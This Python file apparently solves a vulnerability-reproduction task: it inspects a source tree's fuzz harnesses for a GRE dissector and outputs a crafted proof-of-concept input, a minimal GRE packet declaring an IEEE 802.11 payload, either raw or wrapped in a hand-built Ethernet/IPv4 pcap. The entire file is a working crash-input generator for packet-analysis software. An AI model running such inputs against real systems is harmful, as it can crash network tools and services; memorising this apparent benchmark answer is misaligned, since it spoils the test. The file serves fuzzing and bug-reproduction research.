import os
import re
import struct
import tarfile
from typing import Dict, Iterator, Optional, Tuple


def _iter_text_files_from_tar(tar_path: str, max_size: int = 2_000_000) -> Iterator[Tuple[str, str]]:
    with tarfile.open(tar_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            if m.size <= 0 or m.size > max_size:
                continue
            name = m.name
            lname = name.lower()
            if not (lname.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".in", ".inc", ".cmake", ".txt", ".mk", ".sh", ".py"))):
                continue
            f = tf.extractfile(m)
            if f is None:
                continue
            try:
                data = f.read()
            except Exception:
                continue
            if not data:
                continue
            try:
                text = data.decode("utf-8", "ignore")
            except Exception:
                try:
                    text = data.decode("latin-1", "ignore")
                except Exception:
                    continue
            yield name, text


def _iter_text_files_from_dir(root: str, max_size: int = 2_000_000) -> Iterator[Tuple[str, str]]:
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            lname = fn.lower()
            if not (lname.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".in", ".inc", ".cmake", ".txt", ".mk", ".sh", ".py"))):
                continue
            path = os.path.join(dirpath, fn)
            try:
                st = os.stat(path)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > max_size:
                continue
            try:
                with open(path, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            if not data:
                continue
            try:
                text = data.decode("utf-8", "ignore")
            except Exception:
                try:
                    text = data.decode("latin-1", "ignore")
                except Exception:
                    continue
            rel = os.path.relpath(path, root)
            yield rel, text


def _iter_text_files(src_path: str) -> Iterator[Tuple[str, str]]:
    if os.path.isdir(src_path):
        yield from _iter_text_files_from_dir(src_path)
    else:
        if tarfile.is_tarfile(src_path):
            yield from _iter_text_files_from_tar(src_path)
        else:
            return


def _detect_harness_mode(src_path: str) -> str:
    fuzzer_texts = []
    any_capture = False
    any_direct_gre = False

    for name, text in _iter_text_files(src_path):
        lname = name.lower()
        if ("fuzz" in lname) or ("oss-fuzz" in lname) or ("fuzzer" in lname):
            if ("LLVMFuzzerTestOneInput" in text) or ("LLVMFuzzerInitialize" in text) or ("FUZZ" in text and "TestOneInput" in text):
                fuzzer_texts.append(text)
                t = text

                if ("wtap_open_offline" in t) or ("pcap_open_offline" in t) or ("wtap_read" in t) or ("fuzzshark" in t) or ("capture_file" in t):
                    any_capture = True

                if ('find_dissector("gre")' in t) or ("find_dissector(\"gre\")" in t):
                    if ("call_dissector" in t) or ("dissector_handle_t" in t) or ("epan_dissect" in t) or ("tvb_new_real_data" in t):
                        any_direct_gre = True

                if ("fuzz_dissector" in t) and ("gre" in t):
                    any_direct_gre = True

                if ("proto_name" in t) and ("gre" in t) and ("fuzz" in t):
                    any_direct_gre = True

    if any_direct_gre and not any_capture:
        return "raw"

    if any_capture:
        return "pcap"

    for t in fuzzer_texts:
        if ("wtap_open_offline" in t) or ("pcap_open_offline" in t) or ("fuzzshark" in t):
            return "pcap"
        if ('find_dissector("gre")' in t) or ("find_dissector(\"gre\")" in t) or ("fuzz_dissector" in t and "gre" in t):
            return "raw"

    return "pcap"


def _find_gre_linktype(src_path: str) -> Optional[int]:
    candidates = []
    define_re = re.compile(r'^\s*#\s*define\s+(?:DLT|LINKTYPE)_GRE\s+(\d+)\b', re.MULTILINE)
    assign_re = re.compile(r'\b(?:DLT|LINKTYPE)_GRE\s*(?:=|:)\s*(\d+)\b')

    for name, text in _iter_text_files(src_path):
        lname = name.lower()
        if not (("wiretap" in lname) or ("pcap" in lname) or ("libpcap" in lname) or ("encap" in lname) or ("wtap" in lname)):
            continue

        for m in define_re.finditer(text):
            try:
                candidates.append(int(m.group(1)))
            except Exception:
                pass

        for m in assign_re.finditer(text):
            try:
                candidates.append(int(m.group(1)))
            except Exception:
                pass

    if not candidates:
        return None

    candidates = [v for v in candidates if 0 < v < 1_000_000]
    if not candidates:
        return None

    candidates.sort()
    return candidates[0]


def _ipv4_checksum(hdr: bytes) -> int:
    if len(hdr) % 2 == 1:
        hdr += b"\x00"
    s = 0
    for i in range(0, len(hdr), 2):
        s += (hdr[i] << 8) | hdr[i + 1]
        s = (s & 0xFFFF) + (s >> 16)
    s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def _make_raw_gre() -> bytes:
    # GRE header: flags/version=0x0000, proto=0x0019 (IEEE 802.11), payload 1 byte
    return b"\x00\x00\x00\x19\x00"


def _make_eth_ipv4_gre_frame(gre_payload: bytes) -> bytes:
    dst_mac = b"\x00\x00\x00\x00\x00\x00"
    src_mac = b"\x00\x00\x00\x00\x00\x00"
    eth_type = b"\x08\x00"

    version_ihl = 0x45
    tos = 0
    total_len = 20 + len(gre_payload)
    identification = 0
    flags_frag = 0
    ttl = 64
    proto = 47  # GRE
    checksum = 0
    src_ip = b"\x01\x01\x01\x01"
    dst_ip = b"\x02\x02\x02\x02"

    ip_hdr = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl,
        tos,
        total_len,
        identification,
        flags_frag,
        ttl,
        proto,
        checksum,
        src_ip,
        dst_ip,
    )
    csum = _ipv4_checksum(ip_hdr)
    ip_hdr = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl,
        tos,
        total_len,
        identification,
        flags_frag,
        ttl,
        proto,
        csum,
        src_ip,
        dst_ip,
    )

    return dst_mac + src_mac + eth_type + ip_hdr + gre_payload


def _make_pcap(frame: bytes, linktype: int) -> bytes:
    ghdr = struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, linktype)
    phdr = struct.pack("<IIII", 0, 0, len(frame), len(frame))
    return ghdr + phdr + frame


class Solution:
    def solve(self, src_path: str) -> bytes:
        mode = _detect_harness_mode(src_path)
        gre_pkt = _make_raw_gre()

        if mode == "raw":
            return gre_pkt

        gre_linktype = _find_gre_linktype(src_path)
        if gre_linktype is not None:
            return _make_pcap(gre_pkt, gre_linktype)

        frame = _make_eth_ipv4_gre_frame(gre_pkt)
        return _make_pcap(frame, 1)